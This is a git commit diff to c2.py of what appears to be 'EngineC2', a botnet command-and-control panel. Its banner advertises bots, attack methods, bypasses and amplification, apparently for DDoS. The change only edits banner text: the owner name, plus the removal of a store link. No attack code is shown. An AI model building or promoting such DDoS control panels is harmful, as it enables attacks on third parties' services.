13313d254aa5440e7492afd2107b16d119630632
EngineExploit <javi5363367@gmail.com>
2024-10-28 13:27:59 -0400

    Update c2.py

--- c2.py
+++ c2.py
@@ -84,7 +84,7 @@ def ascii_vro():
     clear()
 
 def si():
-    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mEngineC2 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to EngineC2 PN! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: E \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mEngineC2 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to EngineC2 PN! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: EngineExploit \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
     print("")
 
 def tools():
@@ -216,7 +216,7 @@ def amp_games():
 def menu():
     sys.stdout.write(f"         \x1b]2;EngineC2 C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
     clear()
-    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mEngineC2 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to EngineC2 C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: E \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1| Store: https://condi.billgang.store/')
+    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mEngineC2 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to EngineC2 C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: EngineExploit \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1|')
     print("")
     print("""
                         \x1b[38;2;0;212;14m╔═╗ \x1b[38;2;0;186;45m ═╗ ╦  ╔═\x1b[38;2;0;150;88m╗  ╔╦╗ \x1b[38;2;0;113;133m ╔╦╗ \x1b[38;2;0;83;168m ╔═╗ \x1b[38;2;0;49;147m ╔═╗
